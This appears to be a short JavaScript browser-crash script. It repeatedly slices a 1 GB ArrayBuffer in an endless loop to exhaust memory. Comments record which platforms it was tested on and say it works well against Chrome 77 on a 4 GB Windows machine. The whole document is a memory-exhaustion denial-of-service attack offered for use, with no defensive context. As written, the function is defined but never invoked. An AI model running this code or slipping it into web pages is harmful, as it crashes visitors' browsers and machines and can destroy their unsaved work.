(function crash(){
	buff = new ArrayBuffer(1073741824);
	while(true) buff.slice(0, buff.byteLength);
});
/*
	Tested on the following:
	Linux mint - not working
	Chromebooks (version unknown) - not working
	Chrome 77.0.3865.90 non-canary on windows - works very well on 4GB
*/
